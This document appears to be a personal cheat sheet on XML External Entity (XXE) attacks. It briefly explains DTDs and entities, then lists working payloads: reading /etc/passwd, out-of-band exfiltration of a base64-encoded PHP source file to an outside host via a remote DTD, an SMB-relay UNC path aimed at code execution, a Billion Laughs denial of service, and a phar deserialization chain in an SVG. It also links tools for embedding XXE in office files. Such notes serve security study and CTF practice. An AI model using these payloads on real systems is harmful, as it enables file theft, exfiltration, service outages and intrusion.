# XXE (XML External Entity)
[TOC]
###### tags: `Security` `Web`

# XML Format
```
XML declaration:
<?xml version="1.0" ?>

DTD(Document Type Definition):
<!DOCTYPE note [
    <!ELEMENT note (to, from, body)>
    <!ELEMENT to   (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
]>

Element:
<note>
<to>WildfootW</to>
<from>Oscar</from>
<body>Puta</body>
</note>
```
- DOCTYPE: DTD 聲明
- ENTITY: 實體聲明(類似變數)
- SYSTE、PUBLIC: 外部資源申請

## 內部實體
```xml
<!DOCTYPE wildfootw[
    <!ENTITY param "hello">
]>
<root>&param;</root>
```

## 外部實體
```xml
<!DOCTYPE wildfootw[
    <!ENTITY xxe SYSTEM "http://wildfoo.tw/xxe.txt">
]>
<root>&xxe;</root>
```

### Leak information
```xml
<!DOCTYPE wildfootw[
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

- `libxml2.9.0`以後，預設不解析外部實體
- `simplexml_load_file()`舊版本中預設解析實體，但新版要指定第三個參數`LIBXML_NOENT`
- `SimpleXMLElement` is a class in PHP
    - http://php.net/manual/en/class.simplexmlelement.php


## 參數實體
### Leak information
```xml
<!DOCTYPE kaibro[
    <!ENTITY % remote SYSTEM "http://wildfoo.tw/xxe.dtd">
    %remote;
]>
<root>&b;</root>
```
`xxe.dtd`:
```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```

# Test XML
## php simplexml_load_string()
`apt install php7.3-xml`
```
$data = <<<EOF
<!DOCTYPE wildfootw[
  <!ENTITY param "hello world">
]>
<root>&param;</root>
EOF;
echo simplexml_load_string($data);
```

# Attacks
## Blind
### Error-based
[mohemiv](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

### Out of Band 
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/www/index.php">
<!ENTITY % remote SYSTEM "http://wildfoo.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```
`xxe.dtd`:
```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://wildfoo.tw/?x=%file;'>">
```

## XXE + SMBrelay to RCE
[medium](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745)
```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "\\12.34.56.78">
]>
<root>&xxe;</root>
```

# Others
## DoS

- Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## 串 Phar 反序列化

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ 
    <!ENTITY xxe SYSTEM "phar:///var/www/html/images/gginin/xxxx.jpeg" > ]>
    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
</svg>
```

- Example: MidnightSun CTF - Rubenscube

## XXE in Files
- [Black hat 2015 video](https://www.youtube.com/watch?v=LZUlw8hHp44)
### file types
- DOCX
- XLSX
- PPTX
- PDF
### Tools
- [OXML_XXE](https://github.com/BuffaloWill/oxml_xxe)
- [DOCEM](https://github.com/whitel1st/docem)
